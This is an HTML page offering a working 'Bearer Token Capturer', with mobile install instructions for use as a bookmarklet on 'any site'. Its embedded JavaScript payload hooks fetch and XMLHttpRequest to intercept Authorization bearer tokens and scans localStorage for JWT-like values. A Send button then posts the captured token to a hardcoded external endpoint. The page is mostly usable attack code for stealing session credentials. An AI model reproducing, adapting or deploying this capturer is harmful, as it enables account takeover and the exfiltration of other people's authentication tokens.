<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <title>Bearer Token Capturer</title>
  <style>
    :root { --bg:#0b0b0c; --panel:#121214; --ink:#f6f6f7; --muted:#a0a0a5; --accent:#2f7bff; --stroke:#2a2a2e; }
    body { margin:0; font:16px system-ui, -apple-system, Segoe UI, Roboto, Arial; background:#0a0a0b; color:#e8e8ea; }
    .wrap { max-width:820px; margin:0 auto; padding: clamp(16px, 3vw, 32px); }
    h1 { font-size: clamp(20px, 3.2vw, 28px); margin: 8px 0 12px; }
    p { color:#b9b9be; line-height:1.5; }
    .card { background:linear-gradient(180deg, #101012, #0d0d10); border:1px solid #1e1e22; border-radius:16px; padding:16px; box-shadow: 0 8px 28px rgba(0,0,0,.35); }
    .row { display:flex; gap:12px; flex-wrap:wrap; align-items:center; }
    .btn {
      appearance:none; border:0; border-radius:12px; padding:14px 16px; font-weight:700;
      background:var(--accent); color:white; cursor:pointer; flex:0 0 auto; min-width:180px;
    }
    .btn.secondary { background:#1b1b1f; color:#eaeaf0; border:1px solid var(--stroke); }
    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size:14px; }
    textarea.code { width:100%; min-height:140px; background:#0d0d10; color:#eaeaf0; border:1px solid #212126; border-radius:12px; padding:12px; }
    .note { color:#9a9aa2; font-size:14px; }
    .steps ol{ padding-left: 1.1rem; }
    .pill { font-size:12px; color:#9ca3af; border:1px solid #2a2a2e; padding:4px 8px; border-radius:999px; }
    .grid { display:grid; grid-template-columns: 1fr; gap:16px; }
    @media(min-width:760px){ .grid { grid-template-columns: 1fr 1fr; } }
    .ok { color:#65d46e; }
    .err { color:#ff6b6b; }
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Bearer Token Capturer (mobile-friendly)</h1>
    <p>Use this page to either <b>inject</b> the capturer in your own app or install a <b>bookmarklet</b> to capture tokens on any site (mobile & desktop).</p>

    <div class="grid">
      <div class="card">
        <h2>1) One-tap in your own app</h2>
        <p class="note">Embed this page in your app and wire the button below; or just open this page inside the app’s WebView and tap <em>Activate</em>.</p>
        <div class="row">
          <button id="activate" class="btn">Activate Token Capture</button>
          <span id="actMsg" class="pill">idle</span>
        </div>
        <p class="note">This runs in the same origin as your app, so it can capture outgoing <span class="mono">Authorization: Bearer …</span> headers from <span class="mono">fetch</span>/<span class="mono">XHR</span>.</p>
      </div>

      <div class="card">
        <h2>2) Bookmarklet for any site</h2>
        <p class="note">Add the link as a bookmark. On mobile: bookmark this page, edit the bookmark, and replace the URL with the code below.</p>
        <div class="row">
          <button id="copyBm" class="btn">Copy Bookmarklet</button>
          <a id="liveBm" class="btn secondary" href="#" title="Drag on desktop or long-press to copy">Bookmarklet Link</a>
          <span id="bmMsg" class="pill">idle</span>
        </div>
        <p class="note">Or paste manually:</p>
        <textarea id="bmCode" class="code mono" readonly></textarea>
      </div>
    </div>

    <div class="card steps">
      <h2>Mobile install tips</h2>
      <div class="grid">
        <div>
          <h3>iOS (Safari)</h3>
          <ol>
            <li>Tap <b>Share</b> → <b>Add Bookmark</b>.</li>
            <li>Open Bookmarks → <b>Edit</b> the new bookmark.</li>
            <li>Replace its URL with the code you copied.</li>
            <li>Visit the target site, open Bookmarks, and tap the bookmarklet.</li>
          </ol>
        </div>
        <div>
          <h3>Android (Chrome)</h3>
          <ol>
            <li>Bookmark this page.</li>
            <li>Open Bookmarks → find it → <b>Edit</b>.</li>
            <li>Replace its URL with the code you copied.</li>
            <li>Go to the target site and tap the bookmark to run.</li>
          </ol>
          <p class="note">On Android, you can also use browsers that support extensions (e.g., Kiwi) and install it as a userscript.</p>
        </div>
      </div>
    </div>

    <p class="note">Status: <span id="status" class="pill">ready</span></p>
  </div>

  <!-- ===== Capturer payload (will be used both for in-page activate & bookmarklet) ===== -->
  <script id="payload" type="text/plain">
(() => {
  const ENDPOINT = 'https://studio--morricards.us-central1.hosted.app/api/bearer'; // <-- set yours
  if (window.__tokCap) { alert('Token capturer already active.'); return; }
  window.__tokCap = true;

  // ---------- DOM ----------
  const box = document.createElement('div');
  const safe = 'env(safe-area-inset-bottom, 0px)';
  box.style.cssText = `
    position:fixed; inset:auto 12px calc(12px + ${safe}) 12px; z-index:2147483647;
    background:#0b0b0c; color:#fff; border:1px solid #22242a; border-radius:16px;
    padding:12px; box-shadow:0 10px 40px rgba(0,0,0,.55); touch-action:none;
  `;
  box.innerHTML = `
    <div style="display:flex;gap:8px;align-items:center;margin-bottom:8px">
      <div style="font-weight:700">Bearer Capturer</div>
      <div id="__drag" style="margin-left:auto;opacity:.7;cursor:grab">⠿</div>
      <button id="__min" style="background:#1a1c22;border:1px solid #2b2f36;color:#eaeaf0;border-radius:10px;padding:6px 10px">Minimize</button>
      <button id="__close" style="background:#1a1c22;border:1px solid #2b2f36;color:#eaeaf0;border-radius:10px;padding:6px 10px">Close</button>
    </div>
    <textarea id="__tok" placeholder="Bearer token will appear here…" style="width:100%;height:120px;border-radius:12px;padding:10px;border:1px solid #2b2f36;background:#0f1014;color:#eaeaf0;resize:vertical"></textarea>
    <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
      <button id="__send" style="flex:1;min-width:140px;padding:12px;border-radius:12px;border:0;background:#2f7bff;color:#fff;font-weight:700">Send</button>
      <button id="__copy" style="flex:1;min-width:140px;padding:12px;border-radius:12px;border:1px solid #2b2f36;background:#15161c;color:#fff">Copy</button>
      <button id="__scan" style="padding:12px;border-radius:12px;border:1px solid #2b2f36;background:#15161c;color:#fff">Quick Scan</button>
      <span id="__msg" style="margin-left:auto;align-self:center;opacity:.85;font-size:12px"></span>
    </div>
    <div style="margin-top:8px;font-size:12px;color:#a5adba">Tip: trigger any action that calls the API (e.g., navigate or refresh) so headers are sent.</div>
  `;
  document.documentElement.appendChild(box);
  const drag = box.querySelector('#__drag');
  const t = box.querySelector('#__tok');
  const msg = box.querySelector('#__msg');

  const setMsg = (s, ok) => { msg.textContent = s; msg.style.color = ok ? '#65d46e' : '#e5e7eb'; };

  // ---------- Drag (mobile-friendly) ----------
  (function enableDrag() {
    let sx=0, sy=0, x=0, y=0, dragging=false;
    const onStart = (e) => {
      dragging=true; drag.style.cursor='grabbing';
      const p = (e.touches && e.touches[0]) || e;
      sx = p.clientX; sy = p.clientY;
      const r = box.getBoundingClientRect();
      x = r.left; y = r.top;
      e.preventDefault();
    };
    const onMove = (e) => {
      if(!dragging) return;
      const p = (e.touches && e.touches[0]) || e;
      const nx = Math.max(6, Math.min(window.innerWidth - box.offsetWidth - 6, x + (p.clientX - sx)));
      const ny = Math.max(6, Math.min(window.innerHeight - box.offsetHeight - 6, y + (p.clientY - sy)));
      box.style.left = nx + 'px'; box.style.right = 'auto'; box.style.top = ny + 'px'; box.style.bottom = 'auto';
    };
    const onEnd = () => { dragging=false; drag.style.cursor='grab'; };
    drag.addEventListener('mousedown', onStart, {passive:false});
    window.addEventListener('mousemove', onMove, {passive:false});
    window.addEventListener('mouseup', onEnd, {passive:true});
    drag.addEventListener('touchstart', onStart, {passive:false});
    window.addEventListener('touchmove', onMove, {passive:false});
    window.addEventListener('touchend', onEnd, {passive:true});
  })();

  // ---------- Minimize / Close ----------
  box.querySelector('#__min').onclick = () => {
    const c = box.getAttribute('data-min') === '1';
    box.setAttribute('data-min', c ? '0' : '1');
    box.style.height = c ? '' : '52px';
    box.style.overflow = c ? '' : 'hidden';
  };
  box.querySelector('#__close').onclick = () => { box.remove(); window.__tokCap = false; };

  // ---------- Capture logic ----------
  function found(token) {
    if (!token) return;
    t.value = token;
    setMsg('Captured.', true);
    try { localStorage.setItem('__last_bearer', token); } catch(_) {}
  }

  function tryExtractHeader(k, v) {
    if ((k||'').toLowerCase() === 'authorization') {
      const m = /bearer\s+([^\s]+)/i.exec(v||'');
      if (m && m[1]) found(m[1]);
    }
  }

  // patch fetch
  const origFetch = window.fetch;
  window.fetch = async function patchedFetch(input, init) {
    try {
      // headers via Request object
      const req = new Request(input, init);
      for (const [k,v] of req.headers.entries()) tryExtractHeader(k,v);
      return await origFetch(req);
    } catch (e) {
      // fallback if something goes wrong constructing Request
      if (init && init.headers) {
        const h = init.headers;
        if (Array.isArray(h)) h.forEach(([k,v]) => tryExtractHeader(k,v));
        else if (h && typeof h.forEach === 'function') h.forEach((v,k) => tryExtractHeader(k,v));
        else if (typeof h === 'object') Object.entries(h).forEach(([k,v]) => tryExtractHeader(k,v));
      }
      return origFetch(input, init);
    }
  };

  // patch XHR
  const origSetReqHeader = XMLHttpRequest.prototype.setRequestHeader;
  XMLHttpRequest.prototype.setRequestHeader = function(k,v) {
    try { tryExtractHeader(k,v); } catch(_) {}
    return origSetReqHeader.apply(this, arguments);
  };

  // quick scan: look through common storage keys
  function quickScan() {
    let hits = [];
    try {
      for (let i=0;i<localStorage.length;i++){
        const key = localStorage.key(i);
        if (!key) continue;
        const val = localStorage.getItem(key) || '';
        if (/bearer\s+[A-Za-z0-9\-\._~\+\/]+=*/i.test(val) || /(?<![A-Za-z0-9])eyJ[a-zA-Z0-9_\-]+?\.[a-zA-Z0-9_\-]+?\.[a-zA-Z0-9_\-]+(?![A-Za-z0-9])/ .test(val)) {
          hits.push({key, val});
        }
      }
    } catch (_) {}
    if (hits.length) {
      found(hits[0].val.replace(/^Bearer\s+/i,''));
      setMsg(`Found candidate in localStorage (${hits[0].key}).`, true);
    } else {
      setMsg('No obvious tokens in storage.', false);
    }
  }

  // buttons
  box.querySelector('#__copy').onclick = async () => {
    const token = t.value.trim();
    if (!token) { setMsg('No token.', false); return; }
    try { await navigator.clipboard.writeText(token); setMsg('Copied.', true); }
    catch { setMsg('Copy failed.', false); }
  };
  box.querySelector('#__send').onclick = async () => {
    const token = t.value.trim();
    if (!token) { setMsg('No token.', false); return; }
    setMsg('Sending…');
    try {
      const r = await fetch(ENDPOINT, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ token }) });
      setMsg(r.ok ? 'Sent.' : 'Failed: ' + r.status, r.ok);
    } catch {
      setMsg('Error sending.', false);
    }
  };
  box.querySelector('#__scan').onclick = () => quickScan();

  // restore last
  try { const last = localStorage.getItem('__last_bearer'); if (last) t.value = last; } catch(_) {}

  // helpful hint for single-page apps: nudge after navigation
  setTimeout(()=>setMsg('Ready. Trigger an API call to capture.'), 300);
})();
  </script>

  <!-- ===== Page logic: builds bookmarklet + in-page activate ===== -->
  <script>
    const $ = (s)=>document.querySelector(s);
    const status = $('#status');

    function minify(js) {
      // very light minify—removes leading/trailing whitespace and line breaks
      return js.replace(/\n+/g,'\n').replace(/\s+$/,'').replace(/^\s+/,'');
    }

    function mkBookmarklet(src) {
      const code = `javascript:${encodeURIComponent(`(${src})()`)}`
        // Some browsers dislike %20 near the head; they’re fine though—keep encoded
      return code;
    }

    function getPayload() {
      const raw = document.getElementById('payload').textContent;
      return minify(raw);
    }

    function refreshBookmarklet() {
      const src = getPayload();
      const bm = mkBookmarklet(src);
      const live = $('#liveBm');
      const ta = $('#bmCode');
      live.href = bm;
      ta.value = bm;
    }

    async function copy(text, okEl) {
      try { await navigator.clipboard.writeText(text); okEl.textContent = 'copied'; okEl.className='pill ok'; }
      catch { okEl.textContent = 'copy failed'; okEl.className='pill err'; }
      setTimeout(()=>{ okEl.textContent='idle'; okEl.className='pill'; }, 1800);
    }

    // Wire up UI
    window.addEventListener('DOMContentLoaded', () => {
      refreshBookmarklet();

      $('#copyBm').addEventListener('click', () => copy($('#bmCode').value, $('#bmMsg')));

      $('#activate').addEventListener('click', () => {
        try {
          // Run payload in current page (same origin). Useful when this is served from your own app.
          const fn = new Function(`return (${getPayload()})`)();
          fn();
          $('#actMsg').textContent = 'active';
          $('#actMsg').className = 'pill ok';
          status.textContent = 'payload injected';
        } catch (e) {
          console.error(e);
          $('#actMsg').textContent = 'failed';
          $('#actMsg').className = 'pill err';
          status.textContent = 'activation failed';
        }
        setTimeout(()=>{ $('#actMsg').textContent='idle'; $('#actMsg').className='pill'; }, 1800);
      });
    });
  </script>
</body>
</html>
